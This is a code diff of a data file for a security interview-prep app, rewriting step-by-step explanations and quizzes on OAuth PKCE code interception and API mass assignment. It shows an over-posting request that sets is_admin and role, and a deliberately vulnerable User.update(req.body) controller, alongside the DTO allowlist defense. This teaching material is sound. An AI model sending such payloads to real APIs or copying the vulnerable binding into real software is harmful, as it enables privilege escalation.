+        "status": "attack",
+        "whatIsHappeningTitle": "Step 3: Attacker Interception Attempt",
+        "whatIsHappeningText": "Step 3: On mobile devices, a rogue app might intercept the custom URI redirect (myapp://callback?code=123), stealing the code.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "Authorization Code Interception",
+            "definition": "An attack where malicious mobile apps register the same custom URL scheme (e.g. myapp://) to hijack redirect codes."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "Custom URI Scheme Hijacking",
+            "definition": "OS-level ambiguity where multiple mobile apps claim the same redirect protocol scheme."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "On operating systems without Universal Links or App Links, multiple mobile applications could register the same custom URI scheme ('com.mycompany.app://oauth'). A rogue app installed on the device could intercept the incoming authorization code from the redirect URL. Without PKCE, the rogue app could immediately exchange this code for access tokens.",
+        "whyItMatters": "Historically the #1 critical attack vector against OAuth on mobile and desktop operating systems.",
+        "securityVerdict": "Interception attempt: attacker has stolen the code, but lacks the secret code_verifier.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "Mobile OS Custom URI Relay",
+          "method": "Intercepted Intent: com.app://callback?code=auth_code_98214",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Stolen-Parameter: code=auth_code_98214"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Malicious App / Interceptor\" }",
-          "securityAction": "Backend service Malicious App / Interceptor enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "Rogue app captures authorization code from OS broadcast.",
+          "securityAction": "Rogue app attempts to exchange intercepted code at /token endpoint.",
+          "statusBadge": "INTERCEPTION PROBE"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "spa_client",
-        "to": "token_endpoint",
-        "packet": "POST /token [code + code_verifier] -> 200 OK JWT Access Token",
-        "caption": "Step 4: Interview line: \"PKCE protects public clients from authorization code interception attacks by binding the initial authorization request to the token exchange using a dynamically generated SHA-256 cryptographic challenge.\"",
+        "from": "client",
+        "to": "auth_server",
+        "packet": "POST /token (code=auth_code_98214 & code_verifier=dBjftJeZ4...) -> VERIFIED & TOKENS ISSUED",
+        "caption": "Step 4: Interview line: \"PKCE proves that the client requesting the token is the exact same client that initiated the login: the auth server hashes the submitted code_verifier and verifies it matches the original code_challenge.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"PKCE protects public clients from authorization code interception attacks by binding the initial authorization request to the token exchange using a dynamically generated SHA-256 cryptographic challenge.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"PKCE proves that the client requesting the token is the exact same client that initiated the login: the auth server hashes the submitted code_verifier and verifies it matches the original code_challenge.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Token Exchange Verification",
+            "definition": "Auth server executing SHA256(code_verifier) and asserting byte-for-byte equality with stored code_challenge."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "OAuth 2.1 Standard",
+            "definition": "The updated OAuth specification deprecating the Implicit Flow and mandating PKCE for all clients."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "When the authentic client exchanges the code, it sends the original plaintext code_verifier to the back-channel POST /token endpoint. The auth server computes SHA256(code_verifier). Because it matches the code_challenge recorded in Step 2, tokens are issued. If the attacker tries to exchange the stolen code, they cannot provide the verifier, and the exchange fails with invalid_grant.",
+        "whyItMatters": "Guarantees token issuance only to the genuine initiator, rendering code interception completely harmless.",
+        "securityVerdict": "Cryptographic proof of possession verified; tokens issued securely.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "RFC 7636 Token Exchange",
+          "method": "POST /oauth/v2/token",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Content-Type: application/x-www-form-urlencoded",
+            "Host: auth.provider.com"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Always implement Authorization Code Flow with PKCE for all clients (bo...\" }",
-          "securityAction": "Final defensive control verified: Token Endpoint secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "grant_type=authorization_code&code=auth_code_98214&code_verifier=dBjftJeZ4CVP-mB92K...",
+          "securityAction": "Auth Server: SHA256(code_verifier) == code_challenge [MATCH]. Access Token and ID Token issued.",
+          "statusBadge": "PKCE VERIFIED"
         }
       }
     ],
@@ -4128,15 +4190,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Advanced",
     "interviewTakeaway": "Always implement Authorization Code Flow with PKCE for all clients (both public SPAs/mobile apps and confidential server-rendered apps) to provide uniform, modern authorization security.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"How does OAuth 2.0 Authorization Code Flow with PKCE protect public clients (SPAs and Mobile apps)?\"?",
+      "question": "How does the OAuth 2.0 Authorization Code Flow with PKCE (RFC 7636) prevent authorization code injection and interception attacks in public clients?",
       "options": [
-        "POST /token [code + code_verifier] -> 200 OK JWT Access Token",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "The client generates an unhashed code_verifier kept in memory and sends its SHA-256 hash (code_challenge) during authorization; only the client possessing the original code_verifier can redeem the code at the /token endpoint",
+        "It encrypts the entire mobile device using BitLocker or FileVault before the user can click login",
+        "It replaces HTTP redirects with manual email confirmation codes sent to the user's secondary recovery address",
+        "It eliminates authorization codes entirely and sends the user's plaintext password in the URL query string"
       ],
       "correctIndex": 0,
-      "explanation": "Always implement Authorization Code Flow with PKCE for all clients (both public SPAs/mobile apps and confidential server-rendered apps) to provide uniform, modern authorization security."
+      "explanation": "In PKCE, the client generates a high-entropy code_verifier and passes its SHA-256 hash (code_challenge) during the authorization request. Even if an attacker intercepts the authorization code, they cannot redeem it at the /token endpoint without knowing the unhashed code_verifier held in the authentic client's memory."
     }
   },
   {
@@ -4174,144 +4236,143 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Over-Posting Payload Injected",
-        "from": "attacker_payload",
-        "to": "flawed_orm",
-        "packet": "PATCH /api/users/me {\"email\": \"a@a.com\", \"role\": \"admin\", \"balance\": 99999}",
-        "caption": "Step 1: Attacker appends sensitive internal model attributes (role, isAdmin, balance) to a standard profile update JSON request.",
+        "label": "Attacker Injects Privileged Field",
+        "from": "attacker",
+        "to": "api_gateway",
+        "packet": "PUT /api/v1/profile { name: 'Bob', is_admin: true, role: 'superuser', balance: 999999 }",
+        "caption": "Step 1: Attacker appends unexposed internal entity attributes ('is_admin: true', 'role: superuser') to an innocent profile update payload.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 1: Over-Posting Payload Injected",
-        "whatIsHappeningText": "Step 1: Attacker appends sensitive internal model attributes (role, isAdmin, balance) to a standard profile update JSON request.",
+        "whatIsHappeningTitle": "Step 1: Injected Privileged Field",
+        "whatIsHappeningText": "Step 1: Attacker appends unexposed internal entity attributes ('is_admin: true', 'role: superuser') to an innocent profile update payload.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "Mass Assignment / Over-Posting",
+            "definition": "Vulnerability where an API automatically binds client request parameters directly into internal database models or ORM entities."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "OWASP API #3 (BOPLA)",
+            "definition": "Broken Object Property Level Authorization: Failure to restrict which properties of an object a user is allowed to read or update."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "Web frameworks (Rails, Spring, Express, ASP.NET) offer automatic parameter binding for developer convenience. An attacker inspects client code, guesses database model attributes, and appends: '{\"is_admin\": true, \"account_balance\": 1000000}' to a profile update request designed only to update their display name.",
+        "whyItMatters": "Enables instant, effortless privilege escalation and account tampering without finding code injection bugs.",
+        "securityVerdict": "Over-posting payload submitted to probe ORM parameter binding boundaries.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "HTTP/2 REST Endpoint",
+          "method": "PUT /api/v1/users/me",
           "headers": [
-            "Host: api.mass.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Authorization: Bearer eyJhbGci... (User 42)",
+            "Content-Type: application/json"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Auto-Binding ORM\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Auto-Binding ORM.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "{\"displayName\": \"Bob\", \"is_admin\": true, \"role\": \"admin\", \"verified\": true}",
+          "securityAction": "API Gateway passes JSON payload to controller without schema filtering.",
+          "statusBadge": "OVER-POSTING PROBE"
         }
       },
       {
         "id": 2,
-        "label": "Blind Auto-Binding",
-        "from": "flawed_orm",
-        "to": "flawed_orm",
-        "packet": "Vulnerability: ORM maps all request keys directly to DB entity columns",
-        "caption": "Step 2: Flawed implementation: Framework auto-binds entire req.body directly to the ORM database model without field filtering.",
+        "label": "Vulnerable ORM Auto-Binding Execution",
+        "from": "api_gateway",
+        "to": "database",
+        "packet": "User.update(req.body) -> Database executes: UPDATE users SET is_admin = true...",
+        "caption": "Step 2: Flaw: The backend blind-binds req.body directly into the ORM entity (e.g. User.update(req.body)), elevating the attacker to Admin.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 2: Blind Auto-Binding",
-        "whatIsHappeningText": "Step 2: Flawed implementation: Framework auto-binds entire req.body directly to the ORM database model without field filtering.",
+        "whatIsHappeningTitle": "Step 2: Blind ORM Auto-Binding Execution",
+        "whatIsHappeningText": "Step 2: Flaw: The backend blind-binds req.body directly into the ORM entity (e.g. User.update(req.body)), elevating the attacker to Admin.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "Blind Entity Binding",
+            "definition": "Passing unsanitized request bodies directly into ORM/database persistence methods (e.g. Model.update(req.body))."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Privilege Escalation via Property Injection",
+            "definition": "Overriding critical authorization flags (e.g. is_admin, email_verified) through unconstrained parameter binding."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "In the vulnerable controller: 'const user = await User.findById(req.user.id); await user.update(req.body);'. The ORM dynamically maps all JSON keys to table columns. The database updates 'is_admin = true' and 'role = admin'. User 42 has successfully executed a vertical privilege escalation into a superadministrator.",
+        "whyItMatters": "One of the most common oversights in rapid application prototyping and agile development.",
+        "securityVerdict": "Catastrophic privilege elevation: database persists unauthorized property updates.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "PostgreSQL Database UPDATE",
+          "method": "UPDATE users SET displayName = 'Bob', is_admin = true, role = 'admin' WHERE id = 42",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Rows-Affected: 1",
+            "User-Status: Mutated"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Auto-Binding ORM validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "User record #42 updated in database. Privileges elevated to 'admin'.",
+          "securityAction": "Database persists all passed fields because controller failed to enforce a DTO allowlist.",
+          "statusBadge": "ELEVATED TO ADMIN"
         }
       },
       {
         "id": 3,
-        "label": "DTO Whitelist Validation",
-        "from": "attacker_payload",
-        "to": "dto_schema",
-        "packet": "UpdateProfileDTO: Allowed { name, email } -> Strips \"role\"",
-        "caption": "Step 3: Defense: Strict Data Transfer Objects (DTOs) with schema validation (Zod, Pydantic, NestJS DTO) strip non-whitelisted fields.",
+        "label": "DTO / Strong Parameters Allowlist Defense",
+        "from": "api_gateway",
+        "to": "database",
+        "packet": "DTO Allowlist: { displayName: req.body.displayName } -> Ignores all other fields",
+        "caption": "Step 3: Definitive fix: Explicit Data Transfer Objects (DTOs) with strict allowlists (Zod, class-validator) strip out unauthorized properties.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: DTO Whitelist Validation",
-        "whatIsHappeningText": "Step 3: Defense: Strict Data Transfer Objects (DTOs) with schema validation (Zod, Pydantic, NestJS DTO) strip non-whitelisted fields.",
+        "whatIsHappeningTitle": "Step 3: DTO Allowlist Defense",
+        "whatIsHappeningText": "Step 3: Definitive fix: Explicit Data Transfer Objects (DTOs) with strict allowlists (Zod, class-validator) strip out unauthorized properties.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "DTO (Data Transfer Object)",
+            "definition": "An object defining the exact schema and allowed properties for data arriving over the network boundary."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "Strict Schema Filtering (Zod / Joi)",
+            "definition": "Validating incoming payloads against strict schemas that reject or silently strip unapproved attributes."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "The secure implementation adopts strict Data Transfer Objects (DTOs) or strong parameters (e.g. Rails params.require(:user).permit(:displayName) or TypeScript Zod schema: z.object({ displayName: z.string().max(50) }).strip()). Any unapproved keys like is_admin or role are stripped out or trigger a 400 Bad Request before hitting the database.",
+        "whyItMatters": "Decouples public network input interfaces from internal database entity storage models.",
+        "securityVerdict": "Strict property-level authorization enforced; injected parameters purged.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "Schema Validation Layer (Zod / DTO)",
+          "method": "Schema Ingestion & Sanitization",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Validation-Policy: Strict-Allowlist",
+            "Permitted-Fields: displayName"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Strict DTO Schema Validator\" }",
-          "securityAction": "Backend service Strict DTO Schema Validator enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "Incoming keys: [displayName, is_admin, role] -> Filtered output: { displayName: 'Bob' }",
+          "securityAction": "DTO validator discards is_admin and role; passes only explicitly permitted fields to repository.",
+          "statusBadge": "FIELDS STRIPPED"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "dto_schema",
-        "to": "hardened_db",
-        "packet": "UPDATE users SET email = \"a@a.com\" WHERE id = :id",
-        "caption": "Step 4: Interview line: \"Mass Assignment occurs when frameworks blindly bind client JSON directly to database models — eliminate it by using explicit Data Transfer Object (DTO) allowlists and disabling automatic model binding.\"",
+        "from": "api_gateway",
+        "to": "attacker",
+        "packet": "HTTP 200 OK (Only allowed fields updated; is_admin remained false)",
+        "caption": "Step 4: Interview line: \"Defend against Mass Assignment (OWASP API #3) by never binding request bodies directly to database entities: always enforce explicit DTOs with strict attribute allowlists at the controller boundary.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"Mass Assignment occurs when frameworks blindly bind client JSON directly to database models — eliminate it by using explicit Data Transfer Object (DTO) allowlists and disabling automatic model binding.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"Defend against Mass Assignment (OWASP API #3) by never binding request bodies directly to database entities: always enforce explicit DTOs with strict attribute allowlists at the controller boundary.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Principle of Explicit Interfaces",
+            "definition": "Designing public API contracts so every readable and writable field is explicitly declared and authorization-verified."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "Read-Only Entity Fields",
+            "definition": "Designating sensitive database columns (role, tenant_id, balance) as immutable from public REST mutation endpoints."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior candidates conclude with the definitive architectural rule: 'Never trust raw client request bodies to dictate entity attributes. Use dedicated Request DTOs with schema validation libraries (Zod, class-validator, Pydantic) to enforce an explicit allowlist of mutable properties, ensuring security-critical columns can only be modified through dedicated administrative workflows.'",
+        "whyItMatters": "Demonstrates defensive engineering principles that eliminate entire categories of privilege escalation bugs.",
+        "securityVerdict": "Clean boundary between network transport DTOs and internal domain entities enforced.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "REST Response Verification",
+          "method": "HTTP/1.1 200 OK",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Content-Type: application/json",
+            "X-Payload-Sanitized: true"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Always decouple API contracts from database models using explicit DTOs...\" }",
-          "securityAction": "Final defensive control verified: Database Record secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "{\"id\": 42, \"displayName\": \"Bob\", \"is_admin\": false, \"role\": \"member\"}",
+          "securityAction": "Database persisted only displayName; user's role remains unprivileged 'member'.",
+          "statusBadge": "MASS ASSIGNMENT DEFEATED"
         }
       }
     ],
@@ -4350,15 +4411,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Advanced",
     "interviewTakeaway": "Always decouple API contracts from database models using explicit DTOs. Configure schema validators to drop or reject unknown properties with { whitelist: true, forbidNonWhitelisted: true }.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"What is Mass Assignment (Over-Posting / Object Injection) in REST APIs and how is it prevented?\"?",
+      "question": "What is the most effective architectural defense against Mass Assignment (Over-Posting / OWASP API #3) in modern web applications?",
       "options": [
-        "UPDATE users SET email = \"a@a.com\" WHERE id = :id",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Enforcing explicit Request Data Transfer Objects (DTOs) with strict attribute allowlists (e.g. Zod or strong parameters), ensuring unapproved fields like 'is_admin' are rejected or stripped before reaching database entities",
+        "Changing database column names every 24 hours to confuse attackers",
+        "Only allowing users to update their profile via SMS text messages",
+        "Disabling all PUT and PATCH HTTP methods across the entire application"
       ],
       "correctIndex": 0,
-      "explanation": "Always decouple API contracts from database models using explicit DTOs. Configure schema validators to drop or reject unknown properties with { whitelist: true, forbidNonWhitelisted: true }."
+      "explanation": "Mass assignment happens when frameworks automatically bind all incoming request keys to ORM model fields. The definitive defense is using explicit Request DTOs with strict allowlists (e.g. Zod schemas or strong parameters) that only accept approved fields (e.g. displayName), discarding or rejecting unauthorized properties like 'is_admin' or 'role'."
     }
   },
   {
